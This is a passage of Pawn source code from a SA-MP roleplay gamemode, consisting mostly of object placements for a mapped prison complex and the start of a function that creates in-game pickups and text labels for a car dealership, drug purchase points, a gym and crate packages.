	CreateDynamicObject(2210,358.3279400,166.2507800,1025.4200400,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2002,358.1100500,167.2290500,1024.7812500,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(2210,358.4016700,168.1184800,1025.4200400,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2205,354.7947100,171.4297900,1024.6020500,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(2166,356.7525900,172.4147900,1024.7419400,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(1663,354.0950300,172.6074500,1025.2020300,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2309,353.7514000,169.7869300,1024.7619600,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2309,355.9389600,169.8036000,1024.7619600,0.0000000,0.0000000,40.0000000); //
	CreateDynamicObject(2202,357.2663600,174.9685800,1024.7812500,356.8584000,0.0000000,-1.5708000); //
	CreateDynamicObject(2309,361.7505800,169.3923800,1024.7619600,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2309,363.9158600,169.1388500,1024.7619600,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2309,363.9072900,154.5272100,1024.7619600,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(2309,361.8673400,154.6747100,1024.7619600,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(2309,355.9007000,154.9695700,1024.7619600,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(2309,353.8341100,155.1950800,1024.7619600,0.0000000,0.0000000,180.0000000); //
    // New Prison by QUINCY
    CreateDynamicObject(16610,975.3806800,-2307.6767600,15.6400000,0.0000000,0.0000000,24.0000000); //
	CreateDynamicObject(7020,887.0885000,-2356.7131300,9.1200000,0.0000000,0.0000000,24.0000000); //
	CreateDynamicObject(9254,884.1824300,-2322.7434100,12.5999000,0.0000000,0.0000000,-156.0000000); //
	CreateDynamicObject(8168,918.5735500,-2340.4184600,13.8200000,0.0000000,0.0000000,-139.0000000); //
	CreateDynamicObject(1250,920.3082900,-2336.3532700,13.0000000,0.0000000,0.0000000,200.0000000); //
	CreateDynamicObject(968,920.2457300,-2335.9370100,13.5609000,0.0000000,0.0000000,120.0000000); //
	CreateDynamicObject(3996,872.0292400,-2352.0478500,12.2000000,0.0000000,0.0000000,24.0000000); //
	CreateDynamicObject(3550,913.2085000,-2344.5632300,14.0000000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(3550,907.7675200,-2346.9904800,14.0000000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(3550,902.3028000,-2349.4155300,14.0000000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(3550,896.8926400,-2351.8193400,14.0000000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(3550,891.4536700,-2354.2023900,14.0000000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(3550,886.0263100,-2356.6001000,14.0000000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(3550,880.6112100,-2359.0063500,14.0000000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(3550,875.1727300,-2361.4077100,14.0000000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(3749,866.8286100,-2354.7773400,17.8400000,0.0000000,0.0000000,113.0000000); //
	CreateDynamicObject(3749,834.7429200,-2368.6601600,17.8400000,0.0000000,0.0000000,113.0000000); //
	CreateDynamicObject(3550,916.1968400,-2323.6123000,14.0000000,0.0000000,0.0000000,25.0000000); //
	CreateDynamicObject(3550,913.6796300,-2318.2312000,14.0000000,0.0000000,0.0000000,25.0000000); //
	CreateDynamicObject(3550,911.1785900,-2312.8674300,14.0000000,0.0000000,0.0000000,25.0000000); //
	CreateDynamicObject(3550,908.6720000,-2307.4865700,14.0000000,0.0000000,0.0000000,25.0000000); //
	CreateDynamicObject(3550,906.1637000,-2302.1022900,14.0000000,0.0000000,0.0000000,25.0000000); //
	CreateDynamicObject(3550,904.5997900,-2298.7399900,14.0000000,0.0000000,0.0000000,25.0000000); //
	CreateDynamicObject(3550,900.3618200,-2296.9987800,14.0000000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(3550,894.9265100,-2299.4284700,14.0000000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(3550,889.5111100,-2301.8632800,14.0000000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(3550,884.1079700,-2304.2727100,14.0000000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(3550,878.6953100,-2306.6853000,14.0000000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(3550,873.2861300,-2309.0971700,14.0000000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(3550,867.8570600,-2311.5083000,14.0000000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(3550,862.4498900,-2313.9250500,14.0000000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(3550,857.0215500,-2316.3532700,14.0000000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(3550,854.2957200,-2317.5629900,14.0000000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(6959,790.5388800,-2369.9382300,12.1000000,0.0000000,0.0000000,24.0000000); //
	CreateDynamicObject(4005,836.7663000,-2339.8938000,24.9200000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(6959,841.2324200,-2345.1955600,12.1317000,0.0000000,0.0000000,24.0000000); //
	CreateDynamicObject(3550,848.8827500,-2319.9338400,14.0000000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(3550,843.4921900,-2322.3681600,14.0000000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(3660,906.3192700,-2326.6608900,13.7000000,0.0000000,0.0000000,24.0000000); //
	CreateDynamicObject(3660,891.6774300,-2333.1740700,13.7000000,0.0000000,0.0000000,24.0000000); //
	CreateDynamicObject(3660,861.3808000,-2335.3664600,13.7000000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(3660,906.5562700,-2346.2873500,13.7000000,0.0000000,0.0000000,24.0000000); //
	CreateDynamicObject(3660,888.7392600,-2354.2133800,13.7000000,0.0000000,0.0000000,24.0000000); //
	CreateDynamicObject(3660,880.8020000,-2357.7204600,13.7000000,0.0000000,0.0000000,24.0000000); //
	CreateDynamicObject(3660,894.4225500,-2300.4133300,13.7000000,0.0000000,0.0000000,24.0000000); //
	CreateDynamicObject(3660,910.0990600,-2314.0778800,13.7000000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(3660,906.4485500,-2305.8310500,13.7000000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(3660,876.6318400,-2308.3713400,13.7000000,0.0000000,0.0000000,24.0000000); //
	CreateDynamicObject(3660,860.5283800,-2315.5456500,13.7000000,0.0000000,0.0000000,24.0000000); //
	CreateDynamicObject(3550,866.0977200,-2365.0612800,14.0000000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(3550,860.6687600,-2367.4731400,14.0000000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(3550,855.2067300,-2369.8610800,14.0000000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(3550,849.8015100,-2372.2871100,14.0000000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(3550,844.3657200,-2374.6926300,14.0000000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(3550,842.7012900,-2375.4853500,14.0000000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(12941,816.3479600,-2440.1804200,12.0087000,0.0000000,0.0000000,24.0000000); //
	CreateDynamicObject(6157,786.2366300,-2438.4455600,12.0495000,0.0000000,0.0000000,24.0000000); //
	CreateDynamicObject(19381,815.7899800,-2364.2004400,12.0317000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19381,811.9224900,-2355.5437000,12.0317000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19381,808.0667700,-2346.7229000,12.0317000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19381,798.4864500,-2350.9631300,12.0317000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19381,802.2862500,-2359.6838400,12.0317000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19381,806.1839000,-2368.4411600,12.0317000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19381,796.5999100,-2372.7033700,12.0317000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19381,792.7542700,-2363.9824200,12.0317000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19381,789.0474900,-2355.2487800,12.0317000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19381,791.6192600,-2387.2414600,12.0317000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19381,787.6881100,-2378.4765600,12.0317000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19381,783.9220600,-2369.7241200,12.0317000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19381,780.0930800,-2360.9604500,12.0317000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19381,794.5051900,-2349.3335000,12.0000000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19381,804.0008500,-2345.0678700,12.0000000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19381,784.8685900,-2353.6049800,12.0000000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19381,778.2152100,-2356.6103500,12.0200000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19381,770.6358000,-2365.2065400,12.0317000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19381,768.6923800,-2360.8354500,12.0200000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19381,774.5493800,-2373.7763700,12.0317000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19381,778.4229100,-2382.5590800,12.0317000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19381,782.3773800,-2391.3305700,12.0317000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19381,772.8024300,-2395.6015600,12.0317000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19381,763.1859100,-2399.8422900,12.0317000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19381,767.0002400,-2408.6613800,12.0317000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19381,776.2573900,-2404.5358900,12.0317000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19381,785.8142700,-2400.1923800,12.0317000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19381,795.3560800,-2395.9145500,12.0317000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19381,781.8201900,-2412.2766100,12.0317000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19381,772.3985000,-2416.7612300,12.0317000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19381,770.7338900,-2417.0803200,12.0300000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19381,768.8648100,-2386.9399400,12.0317000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19381,765.0429700,-2378.1101100,12.0317000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19381,761.3413100,-2369.5280800,12.0317000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19381,759.3115200,-2391.0634800,12.0317000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19381,755.5255700,-2382.3317900,12.0317000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19381,751.8272700,-2373.7692900,12.0317000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19381,759.5007900,-2365.0395500,12.0200000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19381,750.0313100,-2369.2814900,12.0200000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(987,847.9088100,-2403.1147500,12.0674000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(987,843.0507800,-2392.2153300,12.0674000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(987,840.6120000,-2386.7243700,12.0674000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(987,817.9381100,-2406.2656300,12.0674000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(987,822.7811900,-2417.2026400,12.0674000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(987,813.0860600,-2395.3679200,12.0674000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(987,808.7570200,-2385.6154800,12.0674000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(987,803.9215100,-2374.5981400,12.0674000,0.0000000,0.0000000,24.0000000); //
	CreateDynamicObject(987,814.8492400,-2369.7231400,12.0674000,0.0000000,0.0000000,24.0000000); //
	CreateDynamicObject(987,820.2733200,-2367.3024900,12.0674000,0.0000000,0.0000000,24.0000000); //
	CreateDynamicObject(987,824.3215900,-2420.2272900,12.0674000,0.0000000,0.0000000,24.0000000); //
	CreateDynamicObject(987,835.2269900,-2415.4160200,12.0674000,0.0000000,0.0000000,24.0000000); //
	CreateDynamicObject(6959,806.5769000,-2406.4939000,12.1317000,0.0000000,0.0000000,24.0000000); //
	CreateDynamicObject(19381,800.4751600,-2381.3789100,12.0317000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19381,804.3236700,-2390.1037600,12.0317000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19381,804.9382300,-2391.6164600,12.0317000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(987,850.4212000,-2408.7634300,12.0674000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(987,839.5853900,-2413.5244100,12.0674000,0.0000000,0.0000000,24.0000000); //
	CreateDynamicObject(19377,819.3620000,-2372.7871100,12.0192000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19377,809.8788500,-2377.0175800,12.0192000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19377,814.1511200,-2385.4213900,12.0200000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19377,823.7271700,-2381.3525400,12.0192000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19377,818.2440200,-2394.1582000,12.0200000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19377,822.1639400,-2402.8454600,12.0192000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19377,826.0700700,-2411.6425800,12.0192000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19377,827.4725300,-2389.8918500,12.0192000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19377,831.2792400,-2398.5376000,12.0192000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19377,835.1948200,-2407.1276900,12.0192000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19377,842.9763200,-2403.5830100,12.0000000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19377,838.8891000,-2394.9252900,12.0000000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19377,834.9836400,-2386.2739300,12.0000000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19377,831.1253100,-2377.5366200,12.0000000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19377,844.2296800,-2406.1999500,11.9990000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19377,835.0064700,-2410.5175800,11.9990000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19372,831.4234000,-2415.4592300,12.0387000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19372,828.2423100,-2416.8889200,12.0387000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19372,825.1148700,-2418.2944300,12.0387000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19372,821.9989600,-2419.6696800,12.0387000,0.0000000,90.0000000,24.0000000); //
   	CreateDynamicObject(987,821.4516000,-2417.9521500,12.0674000,0.0000000,0.0000000,24.0000000); //

    docdoor1 = CreateDynamicObject(1495,832.9636800,-2414.7502400,12.0262000,0.0000000,0.0000000,114.0000000); //
    CreateDynamicObject(1495,833.5689700,-2416.1071800,12.0262000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(970,833.1688800,-2415.2321800,15.0043000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(970,833.1688800,-2415.2321800,15.9843000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(970,833.1688800,-2415.2321800,16.9243000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(1495,823.1953100,-2420.7026400,12.0262000,0.0000000,0.0000000,114.0000000); //

    docdoor2 = CreateDynamicObject(1495,822.5892900,-2419.3432600,12.0262000,0.0000000,0.0000000,114.0000000); //
    CreateDynamicObject(970,822.8292200,-2419.8513200,15.0043000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(970,822.8292200,-2419.8513200,15.9443000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(970,822.8292200,-2419.8513200,16.9043000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(987,795.8503400,-2343.9482400,12.0674000,0.0000000,0.0000000,24.0000000); //
	CreateDynamicObject(987,784.9849200,-2348.8090800,12.0674000,0.0000000,0.0000000,24.0000000); //
	CreateDynamicObject(987,774.0911300,-2353.7211900,12.0674000,0.0000000,0.0000000,24.0000000); //
	CreateDynamicObject(987,763.2497600,-2358.6301300,12.0674000,0.0000000,0.0000000,24.0000000); //
	CreateDynamicObject(987,752.3496700,-2363.5173300,12.0674000,0.0000000,0.0000000,24.0000000); //
	CreateDynamicObject(987,744.1427600,-2367.1696800,12.0674000,0.0000000,0.0000000,24.0000000); //
	CreateDynamicObject(987,748.9989000,-2378.1589400,12.0674000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(987,753.8789100,-2389.0778800,12.0674000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(987,758.7150900,-2399.9377400,12.0674000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(987,763.5726300,-2410.8244600,12.0674000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(987,768.4389000,-2421.7502400,12.0674000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(18285,832.4615500,-2387.4499500,12.1216000,0.0000000,0.0000000,140.0000000); //
	CreateDynamicObject(3660,839.4963400,-2388.2075200,13.7000000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(3660,844.9284100,-2400.4123500,13.7000000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(3660,819.5411400,-2407.6726100,13.7000000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(16335,748.3652300,-2371.8916000,12.0910000,0.0000000,0.0000000,-95.0000000); //
	CreateDynamicObject(3660,814.1644300,-2395.5610400,13.7000000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(3660,808.6110200,-2383.1394000,13.7000000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(3660,813.5817900,-2371.2102100,13.7000000,0.0000000,0.0000000,24.0000000); //
	CreateDynamicObject(3660,821.8188500,-2367.5334500,13.7000000,0.0000000,0.0000000,24.0000000); //
	CreateDynamicObject(5837,870.1557600,-2345.3112800,13.7000000,0.0000000,0.0000000,24.0000000); //
	CreateDynamicObject(5837,831.3964800,-2378.4226100,13.7400000,0.0000000,0.0000000,24.0000000); //
	CreateDynamicObject(1216,791.6677200,-2419.7739300,12.4909000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(1216,791.4027700,-2419.1906700,12.4909000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(1216,791.9291400,-2420.3813500,12.4909000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(1216,792.1698600,-2420.9748500,12.4909000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(946,799.7946800,-2429.9685100,14.2400000,0.0000000,0.0000000,24.0000000); //
	CreateDynamicObject(1946,798.1366600,-2426.1530800,12.2893000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(3819,804.5855700,-2422.8295900,12.9264000,0.0000000,0.0000000,24.0000000); //
	CreateDynamicObject(14791,805.3595600,-2391.9077100,13.2200000,0.0000000,0.0000000,24.0000000); //
	CreateDynamicObject(3819,796.3765900,-2395.2622100,12.9264000,0.0000000,0.0000000,-158.0000000); //
	CreateDynamicObject(3819,809.3778100,-2401.2934600,12.9264000,0.0000000,0.0000000,-65.0000000); //
	CreateDynamicObject(987,751.4869400,-2383.5942400,12.0674000,0.0000000,0.0000000,24.0000000); //
	CreateDynamicObject(987,762.3808000,-2378.7507300,12.0674000,0.0000000,0.0000000,24.0000000); //
	CreateDynamicObject(987,773.3239100,-2373.9853500,12.0674000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(987,770.9187000,-2368.5776400,12.0674000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(3425,762.6472200,-2373.2512200,11.9071000,-0.0400000,0.0000000,0.0000000); //
	CreateDynamicObject(6066,778.0081800,-2406.4055200,14.7400000,0.0000000,0.0000000,-66.0000000); //
	CreateDynamicObject(2627,757.8154900,-2382.6540500,12.0518000,0.0000000,0.0000000,20.0000000); //
	CreateDynamicObject(2630,779.0814800,-2397.2739300,12.0918000,0.0000000,0.0000000,-80.0000000); //
	CreateDynamicObject(2628,768.5966200,-2378.1948200,12.0718000,0.0000000,0.0000000,24.0000000); //
	CreateDynamicObject(2629,776.7860100,-2385.1350100,12.0718000,0.0000000,0.0000000,-60.0000000); //
	CreateDynamicObject(2632,763.8758500,-2401.1945800,12.0718000,0.0000000,0.0000000,20.0000000); //
	CreateDynamicObject(2632,761.7929100,-2398.4003900,12.0718000,0.0000000,0.0000000,20.0000000); //
	CreateDynamicObject(2632,759.5459600,-2395.7036100,12.0718000,0.0000000,0.0000000,20.0000000); //
	CreateDynamicObject(2627,759.4327400,-2381.7624500,12.0518000,0.0000000,0.0000000,20.0000000); //
	CreateDynamicObject(2627,761.0712300,-2381.0783700,12.0518000,0.0000000,0.0000000,20.0000000); //
	CreateDynamicObject(2628,770.0405300,-2377.4274900,12.0718000,0.0000000,0.0000000,24.0000000); //
	CreateDynamicObject(2628,771.9572800,-2376.6135300,12.0718000,0.0000000,0.0000000,24.0000000); //
	CreateDynamicObject(2629,777.7044100,-2387.9113800,12.0718000,0.0000000,0.0000000,-70.0000000); //
	CreateDynamicObject(2629,774.7592200,-2383.0664100,12.0718000,0.0000000,0.0000000,-50.0000000); //
	CreateDynamicObject(2630,778.7836900,-2395.2504900,12.0718000,0.0000000,0.0000000,-80.0000000); //
	CreateDynamicObject(9361,810.3084700,-2367.3151900,14.5000000,0.0000000,0.0000000,160.0000000); //
	CreateDynamicObject(11081,776.3122600,-2356.9724100,16.0000000,0.0000000,0.0000000,24.0000000); //
	CreateDynamicObject(11081,780.4155900,-2365.1416000,16.0000000,0.0000000,0.0000000,24.0000000); //
	CreateDynamicObject(987,773.3560800,-2373.9104000,12.0674000,0.0000000,0.0000000,24.0000000); //
	CreateDynamicObject(987,784.2452400,-2369.0566400,12.0674000,0.0000000,0.0000000,24.0000000); //
	CreateDynamicObject(987,795.1721800,-2364.2780800,12.0674000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(987,792.6118200,-2358.5297900,12.0674000,0.0000000,0.0000000,114.0000000); //
	CreateDynamicObject(6959,842.7016000,-2390.3002900,-8.8200000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(6959,828.2612900,-2430.6909200,-8.7400000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(6959,779.0925300,-2452.4768100,-8.7400000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(6959,763.5675000,-2417.6272000,-8.7400000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(6959,749.4898100,-2386.1318400,-8.7400000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19381,769.3539400,-2417.9963400,12.0300000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19381,765.3024900,-2409.2756300,12.0317000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19381,761.4812600,-2400.6113300,12.0317000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19381,757.6609500,-2391.7812500,12.0317000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19381,753.8151900,-2383.0583500,12.0317000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19381,749.9541000,-2374.2736800,12.0317000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19381,748.0651200,-2370.1508800,12.0200000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(6959,911.3106700,-2313.7412100,-8.7400000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(6959,915.3969700,-2322.9021000,-8.7400000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(6959,905.0717800,-2348.9968300,-8.7400000,0.0000000,90.0000000,114.0000000); //
	CreateDynamicObject(6959,868.8809200,-2365.0979000,-8.7400000,0.0000000,90.0000000,114.0000000); //
	CreateDynamicObject(6959,832.4706400,-2381.3361800,-8.7400000,0.0000000,90.0000000,114.0000000); //
	CreateDynamicObject(6959,832.5780600,-2416.6535600,-8.7400000,0.0000000,90.0000000,114.0000000); //
	CreateDynamicObject(6959,818.0889300,-2457.0068400,-8.7400000,0.0000000,90.0000000,114.0000000); //
	CreateDynamicObject(6959,818.0889300,-2457.0068400,-6.0000000,0.0000000,90.0000000,114.0000000); //
	CreateDynamicObject(6959,805.4284100,-2462.5539600,-8.7400000,0.0000000,90.0000000,114.0000000); //
	CreateDynamicObject(6959,884.9017300,-2303.8117700,-8.7400000,0.0000000,90.0000000,114.0000000); //
	CreateDynamicObject(6959,848.4639300,-2320.0112300,-8.7400000,0.0000000,90.0000000,114.0000000); //
	CreateDynamicObject(6959,812.2139900,-2336.2519500,-8.7400000,0.0000000,90.0000000,114.0000000); //
	CreateDynamicObject(6959,775.8002900,-2352.4665500,-8.7400000,0.0000000,90.0000000,114.0000000); //
	CreateDynamicObject(6959,759.5690300,-2359.7080100,-8.7400000,0.0000000,90.0000000,114.0000000); //
	CreateDynamicObject(6959,805.4284100,-2462.5539600,-6.0000000,0.0000000,90.0000000,114.0000000); //
	CreateDynamicObject(19377,839.2023900,-2395.0283200,11.9990000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19377,835.3251300,-2386.3029800,11.9990000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19377,840.1383700,-2372.6853000,11.9990000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19377,849.6959200,-2368.4448200,11.9990000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19377,859.2051400,-2364.2263200,11.9990000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19377,868.8493000,-2359.9702100,11.9990000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19377,878.4406100,-2355.6938500,11.9990000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19377,887.9652700,-2351.4658200,11.9990000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19377,897.5548100,-2347.1879900,11.9990000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19377,906.9794900,-2342.9824200,11.9990000,0.0000000,90.0000000,24.0000000); //
	CreateDynamicObject(19377,916.2407200,-2338.8642600,12.0190000,0.0000000,90.0000000,24.0000000); //

    // DOC Gate
    docgate = CreateObject(19912, 865.172241, -2349.313964, 15.011875, 0.000000, 0.000000, 114.299995);
	print("Static objects loaded.");
	return 1;
}

stock LoadPickups()
{
    Create3DTextLabel(".", COLOR_RED, 1031.6764,-1442.6636,13.5546, 15, 0, 1);
	// Fixing pickups, 1st one doesn't show for some reason
	new string[128];
	//Special Pickups Load
	Bag = CreatePickup(1210, 1, 3342.3894,-1719.6432,12.8942, -1); //Admin Island Store
    // Dealership's Pickups
    CreatePickup(1239, 1, 545.6661,-1292.2437,17.2422); // Dealership
    Create3DTextLabel("Grotti's Vehicles Dealership\nUse {01A9DB}/buycar{FFFFFF} to buy a vehicle", COLOR_WHITE, 545.6661,-1292.2437,17.2422, 15, 0, 1);
	// Drugs Pickups
    CreatePickup(1279, 1, 323.0012,1118.5720,1083.8828); // Actual Seed Pickup
    format(string, sizeof(string), "Seed Pickup\n{01A9DB}/buyseed {FFFFFF}to get seed\nAvailable Stock: {01A9DB}%d{FFFFFF}/{01A9DB}2000", Seed);
    SeedsText = CreateDynamic3DTextLabel(string, COLOR_WHITE, 323.0012,1118.5720,1083.8828, 15);
    CreatePickup(1279, 1, 2345.3992,-1185.6423,1027.9766); // Actual cocaine Pickup
    format(string, sizeof(string), "Cocaine Pickup\n{01A9DB}/buycocaine {FFFFFF}to get cocaine\nAvailable Stock: {01A9DB}%d{FFFFFF}/{01A9DB}2000", cocaine);
    cocaineText = CreateDynamic3DTextLabel(string, COLOR_WHITE, 2345.3992,-1185.6423,1027.9766, 15);
    // Interiors Pickups
    CreatePickup(1239, 1, 757.1003,5.9849,1000.7007, 1); // Gym Training
    Create3DTextLabel("Fighting Styles\n{01A9DB}/train {FFFFFF}to change your fighting style", COLOR_WHITE, 757.1003,5.9849,1000.7007, 15, 1, 1);
    CreatePickup(1239, 1, -1689.6455,1037.2737,45.2109, 0); // Crates packages
    Create3DTextLabel("Crates Packages\n{01A9DB}/getcrate {FFFFFF}to get a package", COLOR_WHITE, -1689.6455,1037.2737,45.2109, 15, 0, 1);
    // Get License
    CreatePickup(1581, 1, 1959.3208,-1129.9222,987.5298, 0); // Crates packages
